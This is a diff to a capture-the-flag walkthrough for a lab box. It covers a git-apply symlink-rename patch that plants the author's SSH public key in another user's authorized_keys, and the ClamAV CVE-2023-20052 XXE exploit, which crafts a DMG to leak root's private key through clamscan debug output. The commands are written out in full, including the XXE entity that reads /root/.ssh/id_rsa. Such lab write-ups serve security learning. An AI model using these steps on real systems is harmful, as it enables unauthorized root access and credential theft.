@@ -298,6 +298,7 @@ git commit -m x
 3) **Write the patch** — it (a) **renames** the symlink, then (b) writes `authorized_keys` *under the renamed symlink* (which still points into sbrown's `.ssh`). Put **your** pubkey on the `+` line:
 
 ```
+cat >patch <<-'EOF'
 diff --git a/symlink b/renamed-symlink
 similarity index 100%
 rename from symlink
@@ -308,7 +309,8 @@ index 0000000..039727e
 --- /dev/null
 +++ b/renamed-symlink/authorized_keys
 @@ -0,0 +1,1 @@
-+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...your_pubkey... you@kali
++ssh-ed25519 AAAAC3NzaC1..your_pubkey noobjb@your_machine
+EOF
 ```
 
 > **Why rename the symlink?** The CVE fix only blocks writing through a symlink that was **already there** before the patch. By **renaming** `symlink` → `renamed-symlink` *inside the same patch* and then writing `renamed-symlink/authorized_keys`, git follows the (renamed) link into `/home/sbrown/.ssh` and the check is bypassed. **Why a git repo at all?** `git apply` works inside a git context and the patch's `rename from symlink` needs that symlink to exist/be tracked — so you stage it first in a clean repo.
@@ -351,20 +353,22 @@ clamscan --version        # ClamAV 1.0.0
 >
 > **Why the "easy" trick doesn't work here:** on the *unpatched* box people did `sudo clamscan -f /root/root.txt` (the error message leaks the file). But this regex **forces `--debug` and a `scanfiles/` path** — `-f /root/...` won't match, so that shortcut is **blocked**. You must use the DMG XXE below.
 
-**The CVE in plain words (CVE-2023-20052):** ClamAV 1.0.0 scans **Apple `.dmg`** images, which contain an **XML plist**. The parser allows **XML external entities (XXE)** — so you define an entity like `<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa">`, reference it in the plist text, and when ClamAV parses the DMG it **substitutes the file's contents** into the text. **`--debug` prints that text**, so **root's private key leaks into the debug output**. Since you run clamscan **as root**, it can read root's files.
+**The CVE in plain words (CVE-2023-20052):** ClamAV is an open-source antivirus tool used to scan files, directories, and emails for viruses, malware, and other threats. You are just simply triggering the it with a customized threat and this vulnerable ClamAV hands you what you are asking for! ClamAV 1.0.0 scans **Apple `.dmg`** images, which contain an **XML plist**. The parser allows **XML external entities (XXE)** — so you define an entity like `<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa">`, reference it in the plist text, and when ClamAV parses the DMG it **substitutes the file's contents** into the text. **`--debug` prints that text**, so **root's private key leaks into the debug output**. Since you run clamscan **as root**, it can read root's files.
 
 > **📝 My run:** elswix's root was easier to follow than 0xdf's, but I got **stuck on the Docker build** (daemon not running → `apt-get update … exit code 100` → then `pull access denied`). The fixes are in the box below — short version: **start docker, build with `--network=host`, and don't `run` until the build actually succeeds.**
 
 ### Build the malicious DMG (Docker path — what the writeup uses)
 
 ```bash
-git clone https://github.com/nokn0wthing/CVE-2023-20052.git
+git clone https://github.com/MOHITSINGHPAPOLA/CVE-2023-20052.git
 cd CVE-2023-20052
 sudo docker build -t cve-2023-20052 .
 sudo docker run -v "$(pwd):/exploit" -it cve-2023-20052 bash
 ```
 
-Inside the container, craft a DMG whose plist reads **root's SSH key**:
+Inside the container, craft a DMG whose plist reads **root's SSH key**: 
+
+(you can find this already on the github readme, just include `/root/.ssh/id_rsa` in the bbe command, cause you want root's ssh key.)
 
 ```bash
 genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
@@ -376,6 +380,7 @@ Copy `exploit.dmg` to the box and scan it as root:
 
 ```bash
 scp -i /tmp/mykey exploit.dmg sbrown@10.129.229.5:/home/sbrown/scanfiles/
+
 sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg
 ```
 
@@ -399,6 +404,7 @@ ssh -i root_key root@10.129.229.5        # cat /root/root.txt   👑
 > - `pull access denied for cve-2023-20052` → this appears **only because the build never succeeded**, so `docker run` tried to pull a non-existent Hub image. **Fix the build first**, then the `run` works (don't run before a clean build).
 > - On **Windows PowerShell**, `$(pwd)` isn't valid — use `-v "${PWD}:/exploit"`. On Linux/pwnbox `$(pwd)` is fine.
 > - **No-Docker alternative:** the only tools the container uses are `genisoimage`, `bbe` (`apt install genisoimage bbe`), and a `dmg` converter from **libdmg-hfsplus** (build from source). If Docker keeps fighting you, install those three on your Linux host and run the same two commands. Docker just bundles them for you.
+> - most importantly search with this cve build fail online, there will be solutions.
 
 ---
 
